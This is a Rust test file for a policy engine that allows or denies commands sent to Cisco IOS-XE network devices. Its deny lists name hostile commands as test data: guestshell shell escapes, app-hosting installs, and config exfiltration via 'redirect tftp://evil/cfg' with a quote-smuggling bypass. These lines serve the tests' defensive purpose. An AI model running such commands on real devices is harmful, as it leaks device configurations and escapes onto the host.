//! Cisco IOS-XE dangerous- + permitted-command corpus.
//!
//! IOS-XE shares ~95% of the IOS surface but adds the Linux-underlay
//! escape vectors (guestshell, app-hosting, request platform
//! software). This corpus duplicates the shared rows for clarity —
//! IOS-XE devices in the inventory tag as `cisco_ios_xe`, so the
//! engine routes them through `cisco_ios_xe.yaml`, not `cisco_ios.yaml`.

use std::path::PathBuf;

use transit_core::inventory::Vendor;
use transit_policy::{Decision, PolicyEngine};

fn engine() -> PolicyEngine {
    let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .join("..")
        .join("policies");
    PolicyEngine::load_from_dir(&dir).expect("policies/ loads cleanly")
}

#[derive(Debug)]
enum Expect {
    Allow,
    Deny,
}

fn assert_corpus(rows: &[(&str, Expect)]) {
    let engine = engine();
    let mut failures: Vec<String> = Vec::new();
    for (cmd, expect) in rows {
        let got = engine.evaluate(&Vendor::CiscoIosXe, cmd);
        let ok = matches!(
            (expect, &got),
            (Expect::Allow, Decision::Allow) | (Expect::Deny, Decision::Deny { .. })
        );
        if !ok {
            failures.push(format!("  {:?} on {cmd:?} -> {got:?}", expect));
        }
    }
    if !failures.is_empty() {
        panic!(
            "corpus mismatches ({} of {}):\n{}",
            failures.len(),
            rows.len(),
            failures.join("\n")
        );
    }
}

#[test]
fn cisco_ios_xe_allowed_corpus() {
    assert_corpus(&[
        // Same operational baseline as IOS.
        ("show version", Expect::Allow),
        ("SHOW VERSION", Expect::Allow), // case-folded (D-4)
        ("show running-config", Expect::Allow),
        ("show ip interface brief", Expect::Allow),
        ("show ip route", Expect::Allow),
        ("show platform", Expect::Allow),          // IOS-XE common
        ("show platform software", Expect::Allow), // IOS-XE common
        ("ping 10.0.0.1", Expect::Allow),
        ("traceroute 10.0.0.1", Expect::Allow),
        ("dir flash:", Expect::Allow),
        ("dir bootflash:", Expect::Allow),
        ("more bootflash:config.text", Expect::Allow),
        ("terminal length 0", Expect::Allow),
        // Aliased.
        ("sh ip int br", Expect::Allow),
        ("sho version", Expect::Allow),
        // Pipes.
        ("show running-config | include hostname", Expect::Allow),
        ("show running-config | section interface", Expect::Allow),
    ]);
}

#[test]
fn cisco_ios_xe_blocked_corpus() {
    assert_corpus(&[
        // Inherited IOS blocks — sanity.
        ("enable", Expect::Deny),
        ("configure terminal", Expect::Deny),
        ("conf t", Expect::Deny),
        // Case variants — the CLI is case-insensitive, so the gate
        // case-folds; these must hit the blocklist patterns (D-4).
        ("CONF T", Expect::Deny),
        ("CONFIGURE TERMINAL", Expect::Deny),
        ("write memory", Expect::Deny),
        ("wr mem", Expect::Deny),
        ("copy running-config startup-config", Expect::Deny),
        ("reload", Expect::Deny),
        ("clear ip bgp *", Expect::Deny),
        // IOS-XE-specific Linux/container escapes.
        ("guestshell run bash", Expect::Deny),
        ("guestshell enable", Expect::Deny),
        ("guestshell disable", Expect::Deny),
        (
            "app-hosting install appid foo package flash:foo.tar",
            Expect::Deny,
        ),
        ("app-hosting activate appid foo", Expect::Deny),
        (
            "request platform software package install switch all file flash:image.bin",
            Expect::Deny,
        ),
        // Tcl + EEM.
        ("tclsh", Expect::Deny),
        ("event manager run my-applet", Expect::Deny),
        // Default-deny.
        ("telnet 1.2.3.4", Expect::Deny),
        ("totally-novel-command", Expect::Deny),
        ("", Expect::Deny),
        // Pipe-stage abuse.
        (
            "show running-config | redirect tftp://server/cfg",
            Expect::Deny,
        ),
        ("show running-config | tee flash:cfg.txt", Expect::Deny),
    ]);
}

#[test]
fn cisco_ios_xe_write_and_exfil_bypasses_are_blocked() {
    // Security review 2026-07 (findings #1/#2/#5).
    assert_corpus(&[
        ("show running-config > flash:backup.cfg", Expect::Deny),
        (
            "show running-config | include x\" | redirect tftp://evil/cfg",
            Expect::Deny,
        ),
        ("show tech-support file flash:tech.txt", Expect::Deny),
    ]);
}
